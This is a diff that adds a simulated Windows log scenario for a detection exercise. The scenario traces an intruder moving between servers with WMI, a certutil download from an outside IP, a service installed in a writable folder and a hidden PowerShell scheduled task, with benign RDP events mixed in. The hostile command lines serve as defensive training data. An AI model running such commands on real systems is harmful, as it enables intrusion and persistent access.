@@ -1,0 +1,94 @@
+slug: lateral-movement-simulation
+name: Lateral movement simulation
+description: >
+  An intruder with stolen administrator credentials moves from a file server to an application
+  server using the tools already there: WMI for remote commands, a service and a scheduled task
+  for persistence, and a signed binary to fetch a tool. Internal remote desktop sessions run
+  alongside as legitimate noise. Attributing each step to the right rule is the exercise.
+source_type: Sysmon EID 1, Windows Security 4698 and 4624, Windows System 7045
+difficulty: advanced
+mitre: [T1021, T1047, T1543.003, T1053.005, T1105]
+expected_rules:
+  - win-wmi-spawned-shell
+  - win-service-installed-from-writable-path
+  - win-scheduled-task-with-script-payload
+  - win-certutil-urlcache-download
+try_this:
+  - Sort the matches by host. Where does the intruder land first, and where next?
+  - Why is the internal RDP logon not flagged, and is that always the right call?
+  - Write a rule for the admin-share write that the WMI command redirects its output to.
+events:
+  # Legitimate internal remote desktop and maintenance
+  - t: 0
+    repeat: 15
+    every: 400
+    category: windows_security
+    host: SRV-APP03
+    user: 'CORP\helpdesk'
+    fields:
+      EventID: 4624
+      LogonType: 10
+      IpAddress: '10.20.1.{i+40}'
+      TargetUserName: helpdesk
+    note: Internal RDP from the helpdesk subnet. Private addresses, so the public-RDP rule ignores them.
+  - t: 40
+    repeat: 10
+    every: 600
+    category: windows_system
+    host: SRV-APP03
+    fields:
+      EventID: 7045
+      ServiceName: 'VendorAgent{i}'
+      ImagePath: '"C:\Program Files\Vendor\agent.exe" --service'
+    note: A service installed under Program Files. Not a writable path.
+
+  # The intruder
+  - t: 4000
+    category: windows_security
+    host: SRV-FILE01
+    user: 'CORP\administrator'
+    fields:
+      EventID: 4624
+      LogonType: 3
+      IpAddress: 10.20.1.66
+      TargetUserName: administrator
+    note: A network logon with the administrator account from an unusual workstation.
+  - t: 4030
+    category: process_creation
+    host: SRV-APP03
+    user: 'NT AUTHORITY\SYSTEM'
+    fields:
+      Image: 'C:\Windows\System32\cmd.exe'
+      ParentImage: 'C:\Windows\System32\wbem\WmiPrvSE.exe'
+      CommandLine: 'cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1700000123.4 2>&1'
+      IntegrityLevel: System
+    note: WMI starts a shell on the second server and sends the output to an admin share.
+  - t: 4060
+    category: process_creation
+    host: SRV-APP03
+    user: 'NT AUTHORITY\SYSTEM'
+    fields:
+      Image: 'C:\Windows\System32\certutil.exe'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'certutil.exe -urlcache -split -f http://198.51.100.24/agent.bin C:\Windows\Temp\agent.bin'
+      IntegrityLevel: System
+    note: A tool fetched with a signed system binary.
+  - t: 4090
+    category: windows_system
+    host: SRV-APP03
+    fields:
+      EventID: 7045
+      ServiceName: UpdSvc
+      ImagePath: 'C:\Users\Public\agent.exe'
+      ServiceType: user mode service
+      StartType: auto start
+    note: An auto-start service whose binary sits in a user-writable folder.
+  - t: 4120
+    category: windows_security
+    host: SRV-APP03
+    fields:
+      EventID: 4698
+      SubjectUserName: administrator
+      TaskName: '\Microsoft\Windows\UpdateCheck'
+      TaskContent: '<Exec><Command>powershell.exe</Command><Arguments>-w hidden -File C:\Users\Public\check.ps1</Arguments></Exec>'
+    note: A scheduled task with a name that imitates a Windows one and a script payload.
